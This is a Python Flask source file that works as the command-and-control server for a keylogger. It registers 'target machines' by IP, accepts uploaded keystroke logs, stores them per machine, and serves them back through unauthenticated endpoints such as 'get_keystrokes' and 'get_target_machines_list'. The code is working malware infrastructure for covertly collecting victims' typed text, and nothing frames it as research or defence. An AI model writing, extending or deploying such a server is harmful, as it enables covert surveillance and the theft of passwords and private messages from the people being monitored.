from flask import Flask, request, jsonify
from flask_cors import CORS
import os, random,string
import time
import os, json, time

app = Flask(__name__)
CORS(app)
DATA_FOLDER = "logs"


def generate_log_filename():
    return "log_" + time.strftime("%Y_%m_%d_%H_%M_%S") + ".txt"


def merge_dicts(*dicts: dict[:str]) -> dict:
    dict_to_ret = dicts[0]
    if len(dicts) > 1:
        for one_dict in dicts[1:]:
            for key, val in one_dict.items():
                if key not in dict_to_ret:
                    dict_to_ret[key] = ""
                dict_to_ret[key] += val

    return dict_to_ret


@app.route('/api/upload', methods=['POST'])
def upload():
    machine_data = request.get_json()
    if not machine_data or "machine" not in machine_data or "data" not in machine_data or not isinstance(machine_data['data'], dict):
        return jsonify({"error": "Invalid payload"}), 400

    with open('data.json', 'r', encoding='utf-8') as f:
        local_data = json.load(f)

    machine_sn = machine_data["machine"].replace("/", "_").replace("..", "_")
    if machine_sn not in local_data:
        return jsonify({"error": "machine not exist"}), 400

    log_data = machine_data["data"]
    machine_path = local_data[machine_sn]['path']
    os.makedirs(machine_path, exist_ok=True)
    try:
        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
            try:
                machine_exist_data = json.load(f)
            except json.JSONDecodeError:
                machine_exist_data = {}
    except FileNotFoundError:
        machine_exist_data = {}
    machine_log = merge_dicts(machine_exist_data, log_data)

    with open(machine_path + '/log.json', "w", encoding="utf-8") as f:
        json.dump(machine_log, f, ensure_ascii=False, indent=4)

    return jsonify({"status": "success"}), 200


@app.route('/api/create_machine', methods=['POST'])
def create_machine():
    data_path = 'data.json'

    data = request.get_json()
    if not data or "ip" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    ip = data["ip"]

    try:
        with open(data_path, 'r', encoding='utf-8') as file:
            try:
                data_dict = json.load(file)
            except json.JSONDecodeError:
                data_dict = {}
    except FileNotFoundError:
        data_dict = {}

    serial_number = int(max(data_dict.keys(), default=1000)) + 1

    data_dict[serial_number] = {'ip': ip, 'path': f'logs/machine_{serial_number}'}
    with open(data_path, 'w', encoding='utf-8') as file:
        json.dump(data_dict, file, ensure_ascii=False, indent=4)

    return jsonify({"serial_number": serial_number}), 200


@app.route('/check_server', methods=['GET'])
def check_server():
    return jsonify({"status": "OK"}), 200

@app.route('/api/get_demo',methods = ['GET'])
def get_demo():
    data = [{"time": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "window": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "text": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8)))} for i in range(random.randint(20,50))]
    return jsonify(data), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine_sn = request.args.get('machine_sn')

    if not machine_sn:
        return jsonify({"error": "invalid machine serial number"}), 400

    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
        if machine_sn not in data:
            return jsonify({"error": "machine not exist"}), 404
    except FileNotFoundError:
        return jsonify({"error": "file not found"}), 500

    machine_path = data[machine_sn]['path']
    try:
        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
            machine_log = json.load(f)

    except Exception as e:
        return jsonify({"error": "logs not found"}), 404

    return jsonify({"keylogs": machine_log}), 200

@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            machines = {sn: machine_data['ip'] for sn, machine_data in data.items()}
    except Exception as e:
        machines = {}

    try:
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": "server error"}), 500




if __name__ == "__main__":
    app.run(port=9734, host='0.0.0.0')
